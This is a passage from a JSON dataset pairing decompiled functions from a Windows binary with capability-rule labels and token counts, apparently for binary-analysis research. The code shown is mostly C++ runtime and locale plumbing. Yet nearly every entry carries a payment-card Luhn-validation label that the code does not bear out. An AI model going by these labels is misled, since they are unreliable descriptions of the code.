0x76);\n        uVar6 = *(uStack24 + 0x74);\njoined_r0x004bc7f4:\n        if (cVar1 != '\\0') {\ncode_r0x004bc716:\n            *(extraout_ECX_00 + 0x74) = uVar6;\n            fcn.004aebe0(uStack24 + 0x6c);\n            fcn.004aed50(auStack64);\n            fcn.004aed00();\n            fcn.004bc290(extraout_ECX_00 + 0x6c);\n            fcn.004b99c0(2);\n            *(extraout_ECX_00 + 0x10) = *(uStack24 + 0x10);\n            fcn.004bc500(*(extraout_ECX_00 + 0x14));\n            return extraout_ECX_00;\n        }\n        if (*(extraout_ECX_00 + 0x7c) != NULL) {\n            (**(**(extraout_ECX_00 + 0x7c) + 0x28))(0x20);\n            *(extraout_ECX_00 + 0x76) = 1;\n            goto code_r0x004bc716;\n        }\n    }\n    fcn.004bde60();\ncode_r0x004bc500:\n    fcn.004c33a0();\n    in_stack_ffffff98 = in_stack_ffffff98 | *(extraout_ECX_01 + 0x14);\n    if (*(extraout_ECX_01 + 0x78) == 0) {\n        in_stack_ffffff98 = in_stack_ffffff98 | 1;\n    }\n    *(extraout_ECX_01 + 0x14) = in_stack_ffffff98;\n    if ((*(extraout_ECX_01 + 0x10) & in_stack_ffffff98) != 0) {\n        fcn.004bdff0(\"basic_ios::clear\");\n        fcn.004aebe0(iStack132 + 0x6c);\n        fcn.004ba260(iStack132, uStack128);\n        fcn.004aed00();\n        fcn.004bc290(uStack128);\n        piVar2 = *(iStack132 + 0x78);\n        if (piVar2 != NULL) {\n            fcn.004aebe0(piVar2 + 7);\n            (**(*piVar2 + 8))(uStack128);\n            fcn.004aed50(uStack128);\n            fcn.004aed00();\n        }\n        return extraout_ECX;\n    }\n    return in_stack_ffffff98;\n}\n",
        "token_count": 1640
    },
    "004bd670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004bd670(void)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uchar uVar5;\n    uchar uVar6;\n    \n    uVar5 = &stack0xfffffff4 < 0x10;\n    uVar6 = *0x10 == 0x1c;\n    puVar1 = sub.msvcrt.dll_setlocale();\n    iVar3 = 2;\n    puVar4 = 0x523d3d;\n    do {\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        uVar5 = *puVar1 < *puVar4;\n        uVar6 = *puVar1 == *puVar4;\n        puVar1 = puVar1 + 1;\n        puVar4 = puVar4 + 1;\n    } while (uVar6);\n    if ((!uVar5 && !uVar6) == uVar5) {\n        uVar2 = fcn.0043df30();\n        return uVar2;\n    }\n    sub.msvcrt.dll_strlen();\n    fcn.004c2c50();\n    sub.msvcrt.dll_memcpy();\n    sub.msvcrt.dll_setlocale();\n    uVar2 = fcn.0043df30();\n    sub.msvcrt.dll_setlocale();\n    fcn.004c2c20();\n    return uVar2;\n}\n",
        "token_count": 320
    },
    "004bdf20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004bdf20(uint param_1, uint param_2, uint *param_3)\n\n{\n    fcn.004be700(param_1, param_2, *param_3, param_3[1]);\n    return;\n}\n",
        "token_count": 56
    },
    "004bdf60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.004bdf60(uint param_1, uint param_2, int32_t *param_3)\n\n{\n    fcn.004be700(param_1, param_2, *param_3, *(*param_3 + -0xc));\n    return;\n}\n",
        "token_count": 61
    },
    "004bdfd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004bdfd0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004c30c0();\n    return *(iVar1 + 4) & 0xffffff00 | *(iVar1 + 4) != 0;\n}\n",
        "token_count": 62
    },
    "004bf230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004bf230(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = fcn.00451af0();\n    uVar4 = 0;\n    puVar1 = *param_1 + 8;\n    if ((uVar3 <= *puVar1 && *puVar1 != uVar3) && (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 != 0)) {\n        uVar3 = fcn.004c33d0(iVar2, 0x5285b0, 0x528cac, 0);\n        uVar4 = uVar3 & 0xffffff00 | uVar3 != 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 201
    },
    "004bf280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004bf280(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = fcn.00451af0();\n    uVar4 = 0;\n    puVar1 = *param_1 + 8;\n    if ((uVar3 <= *puVar1 && *puVar1 != uVar3) && (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 != 0)) {\n        uVar3 = fcn.004c33d0(iVar2, 0x5285b0, 0x528ccc, 0);\n        uVar4 = uVar3 & 0xffffff00 | uVar3 != 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 201
    },
    "004bf2d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004bf2d0(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = fcn.00451af0();\n    uVar4 = 0;\n    puVar1 = *param_1 + 8;\n    if ((uVar3 <= *puVar1 && *puVar1 != uVar3) && (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 != 0)) {\n        uVar3 = fcn.004c33d0(iVar2, 0x5285b0, 0x528cf0, 0);\n        uVar4 = uVar3 & 0xffffff00 | uVar3 != 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 204
    },
    "004bf320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004bf320(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = fcn.00451af0();\n    uVar4 = 0;\n    puVar1 = *param_1 + 8;\n    if ((uVar3 <= *puVar1 && *puVar1 != uVar3) && (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 != 0)) {\n        uVar3 = fcn.004c33d0(iVar2, 0x5285b0, 0x528cfc, 0);\n        uVar4 = uVar3 & 0xffffff00 | uVar3 != 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 202
    },
    "004bf410": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004bf410(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = fcn.00451af0();\n    uVar4 = 0;\n    puVar1 = *param_1 + 8;\n    if ((uVar3 <= *puVar1 && *puVar1 != uVar3) && (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 != 0)) {\n        uVar3 = fcn.004c33d0(iVar2, 0x5285b0, 0x528d20, 0);\n        uVar4 = uVar3 & 0xffffff00 | uVar3 != 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 202
    },
    "004bf460": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004bf460(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = fcn.00451af0();\n    uVar4 = 0;\n    puVar1 = *param_1 + 8;\n    if ((uVar3 <= *puVar1 && *puVar1 != uVar3) && (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 != 0)) {\n        uVar3 = fcn.004c33d0(iVar2, 0x5285b0, 0x528d2c, 0);\n        uVar4 = uVar3 & 0xffffff00 | uVar3 != 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 203
    },
    "004bf4b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004bf4b0(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = fcn.00451af0();\n    uVar4 = 0;\n    puVar1 = *param_1 + 8;\n    if ((uVar3 <= *puVar1 && *puVar1 != uVar3) && (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 != 0)) {\n        uVar3 = fcn.004c33d0(iVar2, 0x5285b0, 0x528d38, 0);\n        uVar4 = uVar3 & 0xffffff00 | uVar3 != 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 204
    },
    "004bf500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004bf500(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = fcn.00451af0();\n    uVar4 = 0;\n    puVar1 = *param_1 + 8;\n    if ((uVar3 <= *puVar1 && *puVar1 != uVar3) && (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 != 0)) {\n        uVar3 = fcn.004c33d0(iVar2, 0x5285b0, 0x528d44, 0);\n        uVar4 = uVar3 & 0xffffff00 | uVar3 != 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 202
    },
    "004bff20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004bff20(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_10h;\n    uint arg_ch;\n    uint s1;\n    int32_t *in_stack_fffffd10;\n    int32_t *in_stack_fffffd2c;\n    int32_t *in_stack_fffffd48;\n    int32_t *in_stack_fffffd64;\n    int32_t *in_stack_fffffd80;\n    int32_t *in_stack_fffffd9c;\n    int32_t *in_stack_fffffdb8;\n    int32_t *in_stack_fffffdd4;\n    int32_t *in_stack_fffffdf0;\n    int32_t *in_stack_fffffe0c;\n    int32_t *in_stack_fffffe28;\n    int32_t *in_stack_fffffe44;\n    int32_t *in_stack_fffffe60;\n    int32_t *in_stack_fffffe7c;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar2 = fcn.00451af0();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*param_1 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffe8 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x52882c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffe8 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffcc = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x52884c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffcc + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffb0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x52886c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffb0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff94 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x52888c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff94 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff78 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x5288ac, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff78 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff5c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x5288b8, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff5c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff40 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528cac, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff40 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff24 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528ccc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff24 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff08 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528cf0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff08 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeec = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528cfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeec + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffed0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffed0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeb4 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d14, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeb4 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe98 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d20, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe98 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe7c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d2c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe7c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe7c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe60 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d38, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe60 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe60 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe44 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d44, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe44 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe44 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe28 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe28 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe28 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe0c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d84, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe0c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe0c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffdf0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528da4, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffdf0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffdf0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffdd4 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528db0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffdd4 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffdd4 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffdb8 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dbc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffdb8 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffdb8 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffd9c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528ddc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffd9c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffd9c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffd80 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffd80 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffd80 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffd64 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffd64 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffd64 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffd48 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e40, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffd48 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffd48 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffd2c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e4c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffd2c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffd2c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffd10 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e58, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffd10 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffd10 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    iVar3 = fcn.00454d90();\n    iVar4 = fcn.00454d90();\n    if (iVar3 == iVar4) {\n        arg_10h = fcn.00454d90();\n        arg_ch = fcn.00454bf0();\n        s1 = fcn.00454bf0();\n        iVar3 = fcn.0048f5c0(s1, arg_ch, arg_10h);\n        if (iVar3 == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 5387
    },
    "004bff80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004bff80(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_10h;\n    uint arg_ch;\n    uint s1;\n    int32_t *in_stack_fffffd2c;\n    int32_t *in_stack_fffffd48;\n    int32_t *in_stack_fffffd64;\n    int32_t *in_stack_fffffd80;\n    int32_t *in_stack_fffffd9c;\n    int32_t *in_stack_fffffdb8;\n    int32_t *in_stack_fffffdd4;\n    int32_t *in_stack_fffffdf0;\n    int32_t *in_stack_fffffe0c;\n    int32_t *in_stack_fffffe28;\n    int32_t *in_stack_fffffe44;\n    int32_t *in_stack_fffffe60;\n    int32_t *in_stack_fffffe7c;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar2 = fcn.00451af0();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*param_1 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffe8 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x52884c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffe8 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffcc = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x52886c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffcc + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffb0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x52888c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffb0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff94 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x5288ac, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < 